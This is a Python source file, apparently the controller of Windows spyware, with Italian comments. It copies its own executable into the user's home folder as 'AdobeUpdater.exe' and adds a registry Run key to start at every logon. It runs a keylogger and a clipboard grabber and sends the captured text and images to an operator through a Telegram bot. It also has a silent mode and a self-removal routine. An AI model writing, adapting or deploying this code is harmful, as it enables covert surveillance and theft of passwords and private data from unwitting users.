import os
import signal
import sys
import winreg
from modulo_telegram import Bot, token
from modulo_context import ContextGrabber
from modulo_keyboard import KeyRegister
from time import sleep
from shutil import copyfile
from subprocess import call as subprocesscall

home = os.path.expanduser("~")

bot = Bot(token)
cg = ContextGrabber(sleep_interval=5)
kr = KeyRegister()

class Manager:
  def __init__(self) -> None:
    self.finalLocation = home + "\\AdobeUpdater.exe" # os.environ["appdata"] + "\\Windows Explorer.exe"
    # kr.sendMessage = lambda msg: bot.sendMessage(msg)
    kr.managerLink = self
    cg.managerLink = self
    bot.managerLink = self
    self.status = 'stopped'
    self.keyRegister = kr
    self.contextGrabber = cg

  def run(self) -> None:
    try: self.checkAndCopy()
    except: pass
    cg.start()
    kr.start()
    bot.run()
    self.status = 'running'
    chatId = self.getChatId()
    if chatId:
      bot.chatId = chatId
      bot.sendMessage(None, 'Current status: running')
  
  def kill(self) -> None:
    # print('Killing myself')
    self.setStatus('exiting')
    cg.kill()
    kr.kill()
    sleep(1)
    bot.kill()
    # print('done')
    sleep(1) # lascia un poco di tempo a tutti per rimuovere cose (gli handlers nel bot telegram, per esempio)
    os.kill(os.getpid(), signal.SIGINT) # Metti fine forzatamente al processo
  
  def setStatus (self, status):
    if status == 'exiting' or \
      (status == 'silent' and self.status == 'running') or \
        (status == 'running' and self.status == 'silent'):
      self.status = status
    bot.sendMessage(None, f'Current status: {self.status}')
    return status == self.status
  
  def sendTextMessage (self, txt):
    if self.status == 'running':
      bot.sendMessage(None, txt)
  
  def sendImageMessage (self, path):
    if self.status == 'running':
      bot.sendImage(None, path)
  
  def onCopyEvent (self):
    self.contextGrabber.onCopyEvent()
  
  def onPasteEvent (self):
    self.contextGrabber.onPasteEvent()
  
  def checkAutostart (self):
    REG_PATH = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
    NAME = 'AdobeUpdater'
    # datatype = winreg.REG_SZ
    try:
      registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
      value, regtype = winreg.QueryValueEx(registry_key, NAME)
      winreg.CloseKey(registry_key)
      return value
    except WindowsError:
      return None
  
  def checkAndCopy (self):
    if not os.path.exists(self.finalLocation):
      copyfile(sys.executable, self.finalLocation)
      try: os.chmod(self.finalLocation, 0o777)
      except: pass
    if not self.checkAutostart():
      subprocesscall('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AdobeUpdater /f /t REG_SZ /d "' + self.finalLocation + '"', shell=True)
      return True
    return False

  def checkAndRemove (self):
    if os.path.exists(self.finalLocation):
      try: os.remove(self.finalLocation)
      except Exception as ex:
        print(ex)
      subprocesscall('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AdobeUpdater /f', shell=True)
      self.deleteChatId()
      # copyfile(sys.executable, self.finalLocation)
      return True
    return False
  
  def removeAutostart (self):
    REG_PATH = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
    NAME = 'AdobeUpdater'
    try:
      registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
      winreg.DeleteKey(registry_key, NAME)
      # winreg.DeleteKey(registry_key, "")
      winreg.CloseKey(registry_key)
    except WindowsError as ex:
      return None

  def saveChatId(self, chatId):
    REG_PATH = 'AdobeUpdater_ch'
    NAME = 'VERSION'
    try:
      winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
      registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
      winreg.SetValueEx(registry_key, NAME, 0, winreg.REG_DWORD, chatId)
      winreg.CloseKey(registry_key)
      return True
    except WindowsError:
      return False

  def getChatId(self):
    REG_PATH = 'AdobeUpdater_ch'
    NAME = 'VERSION'
    try:
      registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
      value, regtype = winreg.QueryValueEx(registry_key, NAME)
      winreg.CloseKey(registry_key)
      return value
    except WindowsError:
      return None
  
  def deleteChatId(self):
    REG_PATH = 'AdobeUpdater_ch'
    NAME = 'VERSION'
    try:
      registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
      # winreg.DeleteKey(registry_key, NAME)
      winreg.DeleteKey(registry_key, "")
      winreg.CloseKey(registry_key)
    except WindowsError as ex:
      return None

if __name__ == '__main__':
  man = Manager()
  man.run()
  # man.saveChatId(123)
  # c = man.getChatId()
  # print(c)
  # man.deleteChatId()
  # print('All started in thread(s)')
  # sleep(120)
  # man.kill()
